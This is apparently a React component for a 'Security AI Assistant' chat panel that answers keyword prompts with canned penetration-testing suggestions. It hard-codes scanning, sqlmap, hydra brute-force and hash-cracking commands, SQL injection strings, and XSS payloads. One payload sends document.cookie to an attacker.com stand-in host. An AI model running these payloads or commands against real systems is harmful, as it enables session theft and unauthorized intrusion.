import React, { useState, useRef } from 'react';
import { Button } from '@/components/ui/button';
import { Input } from '@/components/ui/input';
import { Textarea } from '@/components/ui/textarea';
import { Copy, Send, Bot, Trash, Download, ChevronUp, ChevronDown } from 'lucide-react';
import { useToast } from '@/hooks/use-toast';

interface Message {
  role: 'user' | 'ai';
  content: string;
  timestamp: Date;
  commands?: string[];
}

const AIAutomationPanel: React.FC = () => {
  const [prompt, setPrompt] = useState('');
  const [messages, setMessages] = useState<Message[]>([
    {
      role: 'ai',
      content: 'Hello! I\'m your cybersecurity AI assistant. How can I help you with security testing, automation, or vulnerability assessment today?',
      timestamp: new Date(),
    }
  ]);
  const [isThinking, setIsThinking] = useState(false);
  const messagesEndRef = useRef<HTMLDivElement>(null);
  const { toast } = useToast();

  const securityCommandSuggestions = {
    'scan': [
      'nmap -sV -p- {target}',
      'nikto -h {target}',
      'gobuster dir -u {target} -w /usr/share/wordlists/dirb/common.txt'
    ],
    'web': [
      'sqlmap -u "{target}" --dbs',
      'xss-scanner {target}',
      'wpscan --url {target} --api-token YOUR_TOKEN'
    ],
    'network': [
      'tcpdump -i eth0 host {target}',
      'wireshark -i eth0 -k -Y "host {target}"',
      'traceroute {target}'
    ],
    'password': [
      'hashcat -m 0 hash.txt wordlist.txt',
      'john --wordlist=passwords.txt hashes.txt',
      'hydra -l admin -P password-list.txt {target} http-post-form'
    ]
  };

  const scrollToBottom = () => {
    messagesEndRef.current?.scrollIntoView({ behavior: 'smooth' });
  };

  const handleSubmit = (e: React.FormEvent) => {
    e.preventDefault();
    if (!prompt.trim()) return;
    
    const userMessage: Message = {
      role: 'user',
      content: prompt,
      timestamp: new Date()
    };
    
    setMessages(prev => [...prev, userMessage]);
    setPrompt('');
    setIsThinking(true);
    
    setTimeout(scrollToBottom, 100);
    
    setTimeout(() => {
      let aiResponse: Message;
      
      if (prompt.toLowerCase().includes('scan')) {
        aiResponse = generateScanResponse(prompt);
      } else if (prompt.toLowerCase().includes('xss') || prompt.toLowerCase().includes('cross-site')) {
        aiResponse = generateXSSResponse(prompt);
      } else if (prompt.toLowerCase().includes('sql') || prompt.toLowerCase().includes('injection')) {
        aiResponse = generateSQLResponse(prompt);
      } else if (prompt.toLowerCase().includes('password') || prompt.toLowerCase().includes('brute')) {
        aiResponse = generatePasswordResponse(prompt);
      } else {
        aiResponse = generateGenericResponse(prompt);
      }
      
      setMessages(prev => [...prev, aiResponse]);
      setIsThinking(false);
      
      setTimeout(scrollToBottom, 100);
    }, 1500);
  };

  const generateScanResponse = (prompt: string): Message => {
    const targetMatch = prompt.match(/(?:scan|scanning|analyze)\s+(?:the\s+)?(?:website|site|host|server|domain|ip)?\s*(?:of|at|on)?\s*(?:https?:\/\/)?([a-zA-Z0-9.-]+\.[a-zA-Z]{2,}|(?:\d{1,3}\.){3}\d{1,3})/i);
    const target = targetMatch ? targetMatch[1] : 'example.com';
    
    return {
      role: 'ai',
      content: `Based on your request, here are some recommended scanning commands for ${target}:`,
      timestamp: new Date(),
      commands: securityCommandSuggestions.scan.map(cmd => cmd.replace('{target}', target))
    };
  };
  
  const generateXSSResponse = (prompt: string): Message => {
    return {
      role: 'ai',
      content: 'For Cross-Site Scripting (XSS) testing, here are some useful payloads and testing approaches:',
      timestamp: new Date(),
      commands: [
        '<script>alert("XSS")</script>',
        '<img src="x" onerror="alert(\'XSS\')">',
        '<svg onload="alert(document.domain)">',
        '"><script>fetch(\'https://attacker.com/steal?cookie=\'+document.cookie)</script>'
      ]
    };
  };
  
  const generateSQLResponse = (prompt: string): Message => {
    return {
      role: 'ai',
      content: 'For SQL injection testing, here are some useful payloads and commands:',
      timestamp: new Date(),
      commands: [
        "' OR 1=1--",
        "' UNION SELECT 1,2,3,4,5--",
        "' UNION SELECT table_name,2,3,4,5 FROM information_schema.tables--",
        "sqlmap -u \"https://example.com/page.php?id=1\" --dbs"
      ]
    };
  };
  
  const generatePasswordResponse = (prompt: string): Message => {
    return {
      role: 'ai',
      content: 'For password testing and brute force simulations, these commands are useful:',
      timestamp: new Date(),
      commands: securityCommandSuggestions.password
    };
  };
  
  const generateGenericResponse = (prompt: string): Message => {
    return {
      role: 'ai',
      content: `I understand you're interested in "${prompt.substring(0, 30)}...". Could you specify what kind of security testing you'd like to perform? For example, you might want to scan for vulnerabilities, test for XSS, SQL injection, or perform password analysis.`,
      timestamp: new Date()
    };
  };

  const copyToClipboard = (text: string) => {
    navigator.clipboard.writeText(text);
    toast({
      title: "Copied!",
      description: "Command copied to clipboard",
    });
  };

  const clearConversation = () => {
    setMessages([
      {
        role: 'ai',
        content: 'Hello! I\'m your cybersecurity AI assistant. How can I help you with security testing, automation, or vulnerability assessment today?',
        timestamp: new Date(),
      }
    ]);
  };

  const downloadConversation = () => {
    const text = messages.map(m => `${m.role.toUpperCase()} (${m.timestamp.toLocaleString()}):\n${m.content}\n${m.commands ? '\nCommands:\n' + m.commands.join('\n') + '\n' : ''}\n`).join('\n');
    const blob = new Blob([text], { type: 'text/plain' });
    const url = URL.createObjectURL(blob);
    const a = document.createElement('a');
    a.href = url;
    a.download = `security-ai-conversation-${new Date().toISOString().slice(0, 10)}.txt`;
    document.body.appendChild(a);
    a.click();
    document.body.removeChild(a);
    URL.revokeObjectURL(url);
  };

  return (
    <div className="flex flex-col h-full p-0 text-white bg-[#252526] relative">
      <div className="p-4 border-b border-[#323232] flex items-center justify-between">
        <div className="flex-1 text-center">
          <h2 className="text-xl font-semibold">Security AI Assistant</h2>
        </div>
        <div className="flex text-black space-x-2">
          <Button 
            variant="outline" 
            size="sm" 
            onClick={clearConversation}
            className="border-[#444] text-bg hover:bg-[#3a3a3a]"
          >
            <Trash size={16} />
          </Button>
          <Button 
            variant="outline" 
            size="sm" 
            onClick={downloadConversation}
            className="border-[#444] text-bg hover:bg-[#3a3a3a]"
          >
            <Download size={16} />
          </Button>
        </div>
      </div>
      
      <div className="flex-1 overflow-y-auto p-4 space-y-6">
        {messages.map((message, index) => (
          <div 
            key={index} 
            className={`flex ${message.role === 'user' ? 'justify-end' : 'justify-start'}`}
          >
            <div 
              className={`max-w-[85%] rounded-lg p-3 ${
                message.role === 'user' 
                  ? 'bg-blue-700 text-white' 
                  : 'bg-[#2d2d2d] text-white'
              }`}
            >
              {message.role === 'ai' && (
                <div className="flex items-center mb-1">
                  <Bot size={16} className="mr-2 text-blue-400" />
                  <span className="text-sm text-blue-400">AI Assistant</span>
                </div>
              )}
              
              <div className="text-sm whitespace-pre-wrap">{message.content}</div>
              
              {message.commands && (
                <div className="mt-3 space-y-2">
                  {message.commands.map((cmd, cmdIdx) => (
                    <div key={cmdIdx} className="bg-[#1a1a1a] rounded-md overflow-hidden">
                      <div className="p-2 font-mono text-xs overflow-x-auto whitespace-pre-wrap relative">
                        {cmd}
                        <button 
                          onClick={() => copyToClipboard(cmd)}
                          className="absolute right-1 top-1 p-1 bg-gray-700 hover:bg-gray-600 rounded text-xs text-white"
                        >
                          <Copy size={12} />
                        </button>
                      </div>
                    </div>
                  ))}
                </div>
              )}
              
              <div className="text-right mt-1">
                <span className="text-xs text-gray-400">
                  {message.timestamp.toLocaleTimeString([], {hour: '2-digit', minute:'2-digit'})}
                </span>
              </div>
            </div>
          </div>
        ))}
        
        {isThinking && (
          <div className="flex justify-start">
            <div className="bg-[#2d2d2d] rounded-lg p-3 flex items-center space-x-2">
              <Bot size={16} className="text-blue-400" />
              <div className="typing-indicator">
                <span></span>
                <span></span>
                <span></span>
              </div>
            </div>
          </div>
        )}
        
        <div ref={messagesEndRef} />
      </div>
      
      <div className="p-4 border-t border-[#323232]">
        <form onSubmit={handleSubmit} className="flex items-center">
          <Textarea
            placeholder="Ask about security testing, vulnerability scanning, or automation..."
            value={prompt}
            onChange={(e) => setPrompt(e.target.value)}
            className="flex-1 bg-[#1e1e1e] border-[#444] text-white resize-none min-h-[40px] max-h-[120px]"
            onKeyDown={(e) => {
              if (e.key === 'Enter' && !e.shiftKey) {
                e.preventDefault();
                handleSubmit(e);
              }
            }}
          />
          <Button 
            type="submit" 
            disabled={isThinking || !prompt.trim()}
            className="ml-2 bg-blue-600 hover:bg-blue-700 p-2 h-[40px] w-[40px]"
          >
            <Send size={18} />
          </Button>
        </form>
        <div className="mt-2 text-xs text-gray-400 flex justify-between items-center">
          <span>Shift+Enter for new line</span>
          <span className="text-blue-400 cursor-pointer hover:underline">Suggested prompts</span>
        </div>
      </div>
      
      <style>
        {`
        .typing-indicator {
          display: flex;
          align-items: center;
        }
        .typing-indicator span {
          height: 8px;
          width: 8px;
          background: #3b82f6;
          border-radius: 50%;
          display: inline-block;
          margin: 0 2px;
          opacity: 0.6;
          animation: typing 1.4s infinite ease-in-out;
        }
        .typing-indicator span:nth-child(1) {
          animation-delay: 0s;
        }
        .typing-indicator span:nth-child(2) {
          animation-delay: 0.2s;
        }
        .typing-indicator span:nth-child(3) {
          animation-delay: 0.4s;
        }
        @keyframes typing {
          0%, 100% { transform: translateY(0); }
          50% { transform: translateY(-5px); }
        }
        `}
      </style>
    </div>
  );
};

export default AIAutomationPanel;
